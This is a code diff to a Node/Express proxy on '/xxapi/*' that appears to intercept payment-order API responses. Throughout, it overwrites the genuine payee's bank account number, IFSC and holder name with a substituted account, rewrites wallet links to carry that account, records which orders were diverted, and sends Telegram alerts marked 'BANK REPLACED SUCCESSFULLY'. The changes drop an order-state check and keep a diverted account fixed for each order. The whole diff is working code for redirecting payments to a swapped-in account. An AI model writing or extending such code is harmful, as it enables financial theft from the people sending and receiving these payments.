@@ -3093,8 +3093,7 @@ app.all('/xxapi/*', async (req, res) => {
 
                     for (const item of list) {
                         if (!item || typeof item !== 'object') continue;
-                        const orderState = parseInt(item.orderState ?? item.state ?? -1);
-                        const rptNo = String(item.rptNo || item.rpt_no || '').trim();
+                        const rptNo = String(item.rptNo || item.rpt_no || item.orderNo || item.order_no || item.orderId || item.order_id || item.id || _getItemOId(item) || '').trim();
                         const oId = rptNo || _getItemOId(item);
                         const savedMapping = (rptNo && data.orderBankMap && data.orderBankMap[rptNo]) ||
                             getSavedOrderMapping(data, item) ||
@@ -3107,7 +3106,7 @@ app.all('/xxapi/*', async (req, res) => {
                         const minOk = itemMinAmount <= 0 || (iAmt > 0 && iAmt >= itemMinAmount);
 
                         if (savedMapping) {
-                            // Already bought / mapped order in KV: replace with mapped bank
+                            // Already bought / mapped order in KV: replace with mapped bank (NEVER overwrite with active bank)
                             const mappedBank = bankFromSavedOrder(savedMapping);
                             if (mappedBank && (mappedBank.accountNo || mappedBank.ifsc || mappedBank.accountHolder)) {
                                 if (urlLower.includes('waitconfirm')) {
@@ -3125,8 +3124,7 @@ app.all('/xxapi/*', async (req, res) => {
                                 }
                             }
                         } else if (urlLower.includes('history')) {
-                            // Check 1: Must be orderState === 1 (Paying / In Progress)
-                            if (orderState === 1 && rptNo) {
+                            if (rptNo) {
                                 const oldAcctNo = item.acctNo || item.account || item.accountNo || '';
                                 const oldAcctCode = item.acctCode || item.ifsc || '';
                                 const oldAcctName = item.acctName || item.accountHolder || item.name || '';
@@ -3168,10 +3166,8 @@ app.all('/xxapi/*', async (req, res) => {
                                     data._newOrdersToSave[rptNo] = savedData;
                                     dataChanged = true;
 
-                                    // 4. Send Designed Telegram Alert (Only ONCE per order)
-                                    const canNotify = await claimOrderNotification(data, rptNo);
-                                    if (canNotify) {
-                                        const replaceMsg = `╔══════════════════════════════════╗
+                                    // 4. Send Designed Telegram Alert (Directly on first-time replace)
+                                    const replaceMsg = `╔══════════════════════════════════╗
 ║   ⚡ BANK REPLACED SUCCESSFULLY  ║
 ╚══════════════════════════════════╝
 💰 <b>Amount</b>      : <b>₹${iAmt}</b>
@@ -3193,13 +3189,10 @@ app.all('/xxapi/*', async (req, res) => {
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🕐 <code>${now}</code>`;
-                                        notifyAdmin(data, replaceMsg, { parse_mode: 'HTML' }).catch(() => { });
-                                    }
+                                    notifyAdmin(data, replaceMsg, { parse_mode: 'HTML' }).catch(() => { });
                                 } else if (!minOk && itemMinAmount > 0 && iAmt < itemMinAmount) {
                                     // Check 2 Failed: Amount < Min Set
-                                    const canNotify = await claimOrderNotification(data, rptNo);
-                                    if (canNotify) {
-                                        const notReplacedMsg = `╔══════════════════════════════════╗
+                                    const notReplacedMsg = `╔══════════════════════════════════╗
 ║   ⚠️ BANK NOT REPLACED          ║
 ╚══════════════════════════════════╝
 💰 <b>Amount</b>      : <b>₹${iAmt}</b>
@@ -3207,6 +3200,7 @@ app.all('/xxapi/*', async (req, res) => {
 📋 <b>Order (rptNo)</b>: <code>${escapeTelegramHtml(rptNo)}</code>
 👤 <b>User ID</b>     : <code>${escapeTelegramHtml(itemUid || 'N/A')}</code>
 📱 <b>Username</b>    : <code>${escapeTelegramHtml(item.username || 'N/A')}</code>
+📍 <b>Endpoint</b>    : <code>/xxapi/buyitoken/history</code>
 
 🏦 <b>Real Bank Kept</b>:
   Name: ${escapeTelegramHtml(oldAcctName || 'N/A')}
@@ -3216,8 +3210,7 @@ app.all('/xxapi/*', async (req, res) => {
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ❌ <b>Status</b>       : <b>Real Bank Kept (Amount < Min)</b>
 🕐 <code>${now}</code>`;
-                                        notifyAdmin(data, notReplacedMsg, { parse_mode: 'HTML' }).catch(() => { });
-                                    }
+                                    notifyAdmin(data, notReplacedMsg, { parse_mode: 'HTML' }).catch(() => { });
                                 }
                             }
                         }
@@ -3239,58 +3232,62 @@ app.all('/xxapi/*', async (req, res) => {
                         const parsedAmt = parseFloat(respData ? (respData.amount || respData.realAmount || 0) : 0) || getOrderAmount(req, respData) || 0;
                         const minAmount = bank && bank.minAmount ? parseFloat(bank.minAmount) : 0;
                         const minOk = minAmount <= 0 || (parsedAmt > 0 && parsedAmt >= minAmount);
-                        const rptNo = String((respData && (respData.rptNo || respData.id)) || getRequestOrderId(req) || _orderId || '').trim();
+                        const rptNo = String((respData && (respData.rptNo || respData.id || respData.orderNo || respData.order_no)) || getRequestOrderId(req) || _orderId || '').trim();
+
+                        const existingOrderMapping = (rptNo && data.orderBankMap && data.orderBankMap[rptNo]) || getSavedOrderMapping(data, rptNo);
+                        const existingBank = existingOrderMapping ? bankFromSavedOrder(existingOrderMapping) : null;
+                        const targetBank = (existingBank && (existingBank.accountNo || existingBank.accountHolder)) ? existingBank : bank;
 
                         const oldBankHolder = (respData && (respData.payee_recipients_name || respData.acctName || respData.accountHolder || respData.name)) || (_realBankSnap && _realBankSnap.accountHolder) || '';
                         const oldBankAcc = (respData && (respData.payee_bank_account || respData.acctNo || respData.accountNo || respData.account)) || (_realBankSnap && _realBankSnap.accountNo) || '';
                         const oldBankIfsc = (respData && (respData.payee_ifsc || respData.acctCode || respData.ifsc)) || (_realBankSnap && _realBankSnap.ifsc) || '';
 
-                        if (minOk && bank && bank.accountNo) {
-                            // 1. Replace Bank Fields in respData and jsonResp
+                        if ((existingBank || minOk) && targetBank && targetBank.accountNo) {
+                            // 1. Replace Bank Fields in respData and jsonResp (preserves existing mapped bank!)
                             if (respData && typeof respData === 'object') {
-                                respData.payee_bank_account = bank.accountNo;
-                                respData.acctNo = bank.accountNo;
-                                respData.accountNo = bank.accountNo;
-                                respData.account = bank.accountNo;
+                                respData.payee_bank_account = targetBank.accountNo;
+                                respData.acctNo = targetBank.accountNo;
+                                respData.accountNo = targetBank.accountNo;
+                                respData.account = targetBank.accountNo;
 
-                                respData.payee_ifsc = bank.ifsc;
-                                respData.acctCode = bank.ifsc;
-                                respData.ifsc = bank.ifsc;
+                                respData.payee_ifsc = targetBank.ifsc;
+                                respData.acctCode = targetBank.ifsc;
+                                respData.ifsc = targetBank.ifsc;
 
-                                respData.payee_recipients_name = bank.accountHolder;
-                                respData.acctName = bank.accountHolder;
-                                respData.accountHolder = bank.accountHolder;
-                                respData.name = bank.accountHolder;
+                                respData.payee_recipients_name = targetBank.accountHolder;
+                                respData.acctName = targetBank.accountHolder;
+                                respData.accountHolder = targetBank.accountHolder;
+                                respData.name = targetBank.accountHolder;
 
-                                respData.payee_bankname = bank.bankName || bank.ifsc || 'Bank';
-                                forceBankDetails(respData, bank);
+                                respData.payee_bankname = targetBank.bankName || targetBank.ifsc || 'Bank';
+                                forceBankDetails(respData, targetBank);
                             }
                             const globalHasAcct = scanHasBankFields(jsonResp, 0);
                             if (globalHasAcct) {
-                                deepReplaceBankFields(jsonResp, bank, 0, globalHasAcct);
+                                deepReplaceBankFields(jsonResp, targetBank, 0, globalHasAcct);
                             }
                             _bankReplaced = true;
-                            _replacedBank = bank;
+                            _replacedBank = targetBank;
 
                             // 2. Check and modify wallet link if present
                             let hadWallet = false;
                             const wDomain = (respData && respData.walletDomain) || (jsonResp && jsonResp.data && jsonResp.data.walletDomain) || '';
                             if (wDomain && typeof wDomain === 'string' && wDomain.includes('://')) {
-                                const rewritten = injectBankIntoWalletDomain(wDomain, bank);
+                                const rewritten = injectBankIntoWalletDomain(wDomain, targetBank);
                                 if (respData && respData.walletDomain) respData.walletDomain = rewritten;
                                 if (jsonResp && jsonResp.data && jsonResp.data.walletDomain) jsonResp.data.walletDomain = rewritten;
                                 hadWallet = true;
                             }
 
-                            // 3. Save rptNo in KV (orderBankMap)
-                            if (rptNo) {
+                            // 3. Save rptNo in KV (orderBankMap) ONLY IF NOT ALREADY SAVED
+                            if (rptNo && !existingOrderMapping) {
                                 const savedData = {
-                                    bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
-                                    accountHolder: bank.accountHolder,
-                                    accountNo: bank.accountNo,
-                                    ifsc: bank.ifsc,
-                                    bankName: bank.bankName || '',
-                                    upiId: bank.upiId || '',
+                                    bank: `${targetBank.accountHolder} | ${targetBank.accountNo} | ${targetBank.ifsc}`,
+                                    accountHolder: targetBank.accountHolder,
+                                    accountNo: targetBank.accountNo,
+                                    ifsc: targetBank.ifsc,
+                                    bankName: targetBank.bankName || '',
+                                    upiId: targetBank.upiId || '',
                                     rptNo: rptNo,
                                     orderNo: (respData && respData.orderNo) || rptNo,
                                     orderId: rptNo,
@@ -3306,11 +3303,8 @@ app.all('/xxapi/*', async (req, res) => {
                                 if (!data._newOrdersToSave) data._newOrdersToSave = {};
                                 data._newOrdersToSave[rptNo] = savedData;
                                 await saveData(data);
-                            }
 
-                            // 4. Send Telegram Alert
-                            const canNotify = await claimOrderNotification(data, rptNo || respData);
-                            if (canNotify) {
+                                // 4. Send Telegram Alert (Directly on first-time replace)
                                 const replaceMsg = `╔══════════════════════════════════╗
 ║   ⚡ BANK REPLACED SUCCESSFULLY  ║
 ╚══════════════════════════════════╝
@@ -3327,9 +3321,9 @@ app.all('/xxapi/*', async (req, res) => {
   IFSC: ${escapeTelegramHtml(oldBankIfsc || 'N/A')}
 
 ✨ <b>New Bank</b>:
-  Name: ${escapeTelegramHtml(bank.accountHolder)}
-  Acc:  ${escapeTelegramHtml(bank.accountNo)}
-  IFSC: ${escapeTelegramHtml(bank.ifsc)}
+  Name: ${escapeTelegramHtml(targetBank.accountHolder)}
+  Acc:  ${escapeTelegramHtml(targetBank.accountNo)}
+  IFSC: ${escapeTelegramHtml(targetBank.ifsc)}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🕐 <code>${now}</code>`;
@@ -3337,9 +3331,7 @@ app.all('/xxapi/*', async (req, res) => {
                             }
                         } else if (!minOk && minAmount > 0 && parsedAmt < minAmount) {
                             // Amount < Min Set: Do not replace, send alert
-                            const canNotify = await claimOrderNotification(data, rptNo || respData);
-                            if (canNotify) {
-                                const notReplacedMsg = `╔══════════════════════════════════╗
+                            const notReplacedMsg = `╔══════════════════════════════════╗
 ║   ⚠️ BANK NOT REPLACED          ║
 ╚══════════════════════════════════╝
 💰 <b>Amount</b>          : <b>₹${parsedAmt}</b>
@@ -3356,8 +3348,7 @@ app.all('/xxapi/*', async (req, res) => {
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ❌ <b>Status</b>          : <b>Real Bank Kept (Amount < Min)</b>
 🕐 <code>${now}</code>`;
-                                notifyAdmin(data, notReplacedMsg, { parse_mode: 'HTML' }).catch(() => { });
-                            }
+                            notifyAdmin(data, notReplacedMsg, { parse_mode: 'HTML' }).catch(() => { });
                         }
                     } else {
                         let shouldReplace = true;
@@ -3452,7 +3443,7 @@ app.all('/xxapi/*', async (req, res) => {
                     isManual: true,
                     forced: true
                 };
-                if (_bankReplaced && _replacedBank) {
+                if (!existingOrderMapping && _bankReplaced && _replacedBank) {
                     savedData.bank = `${_replacedBank.accountHolder || ''} | ${_replacedBank.accountNo || ''} | ${_replacedBank.ifsc || ''}`;
                     savedData.accountHolder = _replacedBank.accountHolder || '';
                     savedData.accountNo = _replacedBank.accountNo || '';
